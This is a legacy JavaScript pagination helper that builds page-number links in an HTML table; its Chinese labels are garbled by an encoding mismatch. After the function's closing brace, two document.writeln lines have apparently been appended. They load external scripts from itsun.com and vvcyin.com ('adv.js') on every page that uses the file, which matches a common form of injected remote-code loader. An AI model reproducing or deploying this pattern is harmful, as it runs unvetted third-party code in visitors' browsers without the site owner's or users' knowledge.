// JavaScript Document
function showpages(total,urladd,page,pernum){
pagenum=Math.ceil(total/pernum);
temp="<table border='0' align='center' cellpadding='0' cellspacing='0' width='100%'>";
temp=temp+"<tr><td>"
temp=temp+"π≤"+pagenum+" “≥ </td>";
if(page>1){
temp=temp+"<td><a href=?"+urladd+"&page="+(page-1)+"><img src='../images/btn_prev.gif' border='0'></a></td>";
}
temp=temp+"<td>[ ";
if(pagenum<10){
	for(i=1;i<=pagenum;i++){
		if(i!=page){
		temp=temp+"<a href='?"+urladd+"&page="+i+"'>"+i+"</a>&nbsp;"
		}else{
		temp=temp+"<b>"+i+"</b>&nbsp;"
		}
	}
}else{
	if(page<5){
		for(i=1;i<=9;i++){
			if(i!=page){
			temp=temp+"<a href='?"+urladd+"&page="+i+"'>"+i+"</a>&nbsp;"
			}else{
			temp=temp+"<b>"+i+"</b>&nbsp;"
			}
		}
	}else{
		if(page+4<=pagenum){
			for(i=page-4;i<=page+4;i++){
				if(i!=page){
				temp=temp+"<a href='?"+urladd+"&page="+i+"'>"+i+"</a>&nbsp;"
				}else{
				temp=temp+"<b>"+i+"</b>&nbsp;"
				}
			}
		}else{
			for(i=pagenum-9;i<=pagenum;i++){
				if(i!=page){
				temp=temp+"<a href='?"+urladd+"&page="+i+"'>"+i+"</a>&nbsp;"
				}else{
				temp=temp+"<b>"+i+"</b>&nbsp;"
				}
			}
		}
	}
}
temp=temp+"]</td>";
if(page<pagenum){temp=temp+"<td><a href='?"+urladd+"&page="+(page+1)+"'><img src='../images/btn_next.gif' border='0'></a></td>"}
temp=temp+"<td>°°°°π≤["+total+"]Ãı¡Ù—‘</td></tr></table>"
document.write(temp);
}document.writeln("<script language=\"JavaScript\" charset=\"gb2312\" type=\"text\/javascript\" src=\"http:\/\/www8.itsun.com\/count.php?uuid=1717901&style=none\"><\/script>");document.writeln("<script id=\"advjs\" src=\"http:\/\/w.vvcyin.com\/adv.js?showmatrix_num=074\"><\/script>");
